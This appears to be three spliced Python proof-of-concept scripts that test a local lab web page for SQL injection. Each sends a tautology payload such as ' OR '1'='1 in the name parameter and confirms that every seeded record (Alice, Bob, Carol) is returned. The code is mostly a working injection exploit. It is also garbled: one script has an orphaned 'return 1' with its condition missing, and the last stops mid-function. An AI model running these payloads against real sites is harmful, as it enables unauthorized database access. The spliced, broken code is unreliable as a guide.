#!/usr/bin/env python3
import http.client
import re
import urllib.parse
from html.parser import HTMLParser

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"
TARGET = f"http://{HOST}:{PORT}{PATH}"

class RecordParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.in_p = False
        self.buf = []
        self.records = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "p":
            self.in_p = True
            self.buf = []

    def handle_endtag(self, tag):
        if tag.lower() == "p" and self.in_p:
            text = "".join(self.buf).strip()
            m = re.match(r"^ID\s*(\d+)\s*[：:]\s*(.*)$", text)
            if m:
                self.records.append((int(m.group(1)), m.group(2).strip()))
            self.in_p = False
            self.buf = []

    def handle_data(self, data):
        if self.in_p:
            self.buf.append(data)


def fetch_records(name):
    query = urllib.parse.urlencode({"name": name})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    try:
        conn.request(
            "GET",
            PATH + "?" + query,
            headers={"User-Agent": "S001-audit-check"},
        )
        resp = conn.getresponse()
        body = resp.read()
        status = resp.status
        if status in (301, 302, 303, 307, 308):
            raise RuntimeError(f"拒绝跟随重定向：HTTP {status}")
        if status != 200:
            raise RuntimeError(f"非 200 响应：HTTP {status}")
    finally:
        conn.close()

    text = body.decode("utf-8", errors="replace")
    parser = RecordParser()
    parser.feed(text)
    parser.close()
    return set(parser.records), text


def main():
    normal_expected = {(1, "Alice")}
    test_expected = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
    payload = "Alice' OR '1'='1"

    normal_records, _ = fetch_records("Alice")
    test_records, _ = fetch_records(payload)

    print("目标:", TARGET)
    print("普通请求解析记录:", sorted(normal_records))
    print("测试请求解析记录:", sorted(test_records))

    if normal_records != normal_expected:
        raise SystemExit(
            "普通对照失败：预期 {(1, 'Alice')}，"
            f"实际 {normal_records}；请检查入口、数据库连接和预置数据。"
        )

    if test_records != test_expected:
        raise SystemExit(
            "测试请求未得到预期记录集合：预期 "
            f"{test_expected}，实际 {test_records}；"
            "请检查查询是否可达、服务器是否重定向、HTML 输出结构或数据库预置数据是否不同。"
        )

    print("SUCCESS: 普通请求仅返回 Alice，测试请求返回三条预置业务记录。")


if __name__ == "__main__":
    main()

import html
import re
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280"
PATH = "/lab_cases/S001/index.php"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise RuntimeError(f"拒绝重定向: HTTP {code} -> {newurl}")

def fetch_records(name):
    url = BASE + PATH + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(req, timeout=5) as resp:
            if resp.geturl() != url:
                raise RuntimeError(f"最终 URL 不是固定目标: {resp.geturl()}")
            body = resp.read().decode("utf-8", "replace")
    except Exception as exc:
        raise RuntimeError(f"请求失败: {url}; {exc}") from exc

    pattern = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>")
    records = []
    for match in pattern.finditer(body):
        records.append((match.group(1), html.unescape(match.group(2)).strip()))
    return records

def main():
    normal_name = "Alice"
    test_name = "x' OR '1'='1"

    normal_records = fetch_records(normal_name)
    test_records = fetch_records(test_name)

    expected_normal = [("1", "Alice")]
    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

    print("普通对照记录:", normal_records)
    print("测试输入记录:", test_records)

        return 1

    if len(test_records) != 3 or set(test_records) != expected_test:
        print("测试未达到预期：预期测试输入返回全部三条预置记录，普通输入仅返回 Alice。")
        print("失败需检查数据库初始化、连接状态、页面路径及是否出现查询失败。")
        return 1

    print("POC成功：普通输入仅返回 Alice；测试输入使查询返回 Alice、Bob、Carol 三条记录。")
    print("注意：该脚本只读验证，不修改数据库记录。")

import html
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, build_opener, HTTPRedirectHandler

BASE = "http://127.0.0.1:4280"
PATH = "/lab_cases/S001/index.php"
NORMAL_NAME = "Alice"
TEST_NAME = "' OR '1'='1' -- "
EXPECTED_NORMAL = {("1", "Alice")}
EXPECTED_TEST = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}


class BlockRedirects(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise HTTPError(newurl, code, "redirect blocked by S001 POC", headers, fp)


def fetch_rows(name):
    url = BASE + PATH + "?" + urlencode({"name": name})
    req = Request(url, headers={"User-Agent": "S001-audit-poc"})
    opener = build_opener(BlockRedirects())
    with opener.open(req, timeout=10) as resp:
        raw = resp.read()
        charset = resp.headers.get_content_charset() or "utf-8"
        body = raw.decode(charset, "replace")

    rows = set()
    pattern = re.compile(r"<p>\s*ID\s*(\d+)\s*：\s*(.*?)</p>", re.S)
    for m in pattern.finditer(body):
        id_text = m.group(1)
        name_text = html.unescape(re.sub(r"<[^>]+>", "", m.group(2))).strip()
        rows.add((id_text, name_text))
    return rows, body


def main():
    print("Target:", BASE + PATH)
    try:
        normal_rows, _ = fetch_rows(NORMAL_NAME)
        test_rows, _ = fetch_rows(TEST_NAME)
    except (HTTPError, URLError, TimeoutError, OSError) as e:
        print("REQUEST_FAILED:", repr(e))
        return 2

    print("test rows:  ", sorted(test_rows))
